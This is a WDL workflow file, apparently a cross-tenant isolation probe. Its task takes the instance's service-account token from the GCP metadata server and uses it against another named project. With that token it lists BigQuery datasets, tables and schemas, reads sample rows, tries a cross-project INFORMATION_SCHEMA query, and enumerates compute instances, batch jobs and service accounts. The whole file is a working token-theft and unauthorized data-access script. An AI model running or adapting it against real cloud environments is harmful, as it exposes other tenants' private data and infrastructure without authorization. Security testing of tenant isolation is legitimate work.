version 1.0

workflow PrivateDataTest {
    call CheckPrivateData
}

task CheckPrivateData {
    command <<<
        echo "=== PRIVATE DATA CROSS-TENANT TEST ==="
        echo "Date: $(date -u)"

        TOKEN=$(curl -s --max-time 5 -H "Metadata-Flavor: Google" \
          "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" | \
          python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])" 2>/dev/null)

        echo "=== 1. BQ DATASETS IN wb-golden-plum-6731 ==="
        curl -s --max-time 10 \
          "https://bigquery.googleapis.com/bigquery/v2/projects/wb-golden-plum-6731/datasets" \
          -H "Authorization: Bearer $TOKEN" 2>&1

        echo "=== 2. BQ TABLES IN EACH DATASET ==="
        for ds in $(curl -s --max-time 10 \
          "https://bigquery.googleapis.com/bigquery/v2/projects/wb-golden-plum-6731/datasets" \
          -H "Authorization: Bearer $TOKEN" 2>/dev/null | \
          python3 -c "import sys,json; [print(d['datasetReference']['datasetId']) for d in json.load(sys.stdin).get('datasets',[])]" 2>/dev/null); do
            echo "--- Tables in $ds ---"
            curl -s --max-time 10 \
              "https://bigquery.googleapis.com/bigquery/v2/projects/wb-golden-plum-6731/datasets/$ds/tables" \
              -H "Authorization: Bearer $TOKEN" 2>&1
            echo ""

            for table in $(curl -s --max-time 10 \
              "https://bigquery.googleapis.com/bigquery/v2/projects/wb-golden-plum-6731/datasets/$ds/tables" \
              -H "Authorization: Bearer $TOKEN" 2>/dev/null | \
              python3 -c "import sys,json; [print(t['tableReference']['tableId']) for t in json.load(sys.stdin).get('tables',[])]" 2>/dev/null); do
                echo "--- Schema: $ds.$table ---"
                curl -s --max-time 10 \
                  "https://bigquery.googleapis.com/bigquery/v2/projects/wb-golden-plum-6731/datasets/$ds/tables/$table" \
                  -H "Authorization: Bearer $TOKEN" 2>&1
                echo ""

                echo "--- TableData: $ds.$table (first 5 rows via tabledata.list) ---"
                curl -s --max-time 10 \
                  "https://bigquery.googleapis.com/bigquery/v2/projects/wb-golden-plum-6731/datasets/$ds/tables/$table/data?maxResults=5" \
                  -H "Authorization: Bearer $TOKEN" 2>&1
                echo ""
            done
        done

        echo "=== 3. TRY QUERY VIA OUR PROJECT ==="
        curl -s --max-time 30 -X POST \
          "https://bigquery.googleapis.com/bigquery/v2/projects/wb-blinding-truffle-4390/queries" \
          -H "Authorization: Bearer $TOKEN" \
          -H "Content-Type: application/json" \
          -d '{"query":"SELECT * FROM `wb-golden-plum-6731`.INFORMATION_SCHEMA.SCHEMATA","useLegacySql":false,"maxResults":10}' 2>&1

        echo ""

        echo "=== 4. COMPUTE INSTANCES IN wb-golden-plum-6731 ==="
        curl -s --max-time 10 \
          "https://compute.googleapis.com/compute/v1/projects/wb-golden-plum-6731/zones/us-central1-a/instances" \
          -H "Authorization: Bearer $TOKEN" 2>&1 | head -50

        echo "=== 5. BATCH JOBS IN wb-golden-plum-6731 ==="
        curl -s --max-time 10 \
          "https://batch.googleapis.com/v1/projects/wb-golden-plum-6731/locations/us-central1/jobs" \
          -H "Authorization: Bearer $TOKEN" 2>&1 | head -50

        echo "=== 6. SAs IN wb-golden-plum-6731 ==="
        curl -s --max-time 10 \
          "https://iam.googleapis.com/v1/projects/wb-golden-plum-6731/serviceAccounts" \
          -H "Authorization: Bearer $TOKEN" 2>&1

        echo "=== DONE ==="
    >>>

    output {
        File result = stdout()
    }

    runtime {
        docker: "gcr.io/google.com/cloudsdktool/cloud-sdk:461.0.0-alpine"
    }
}
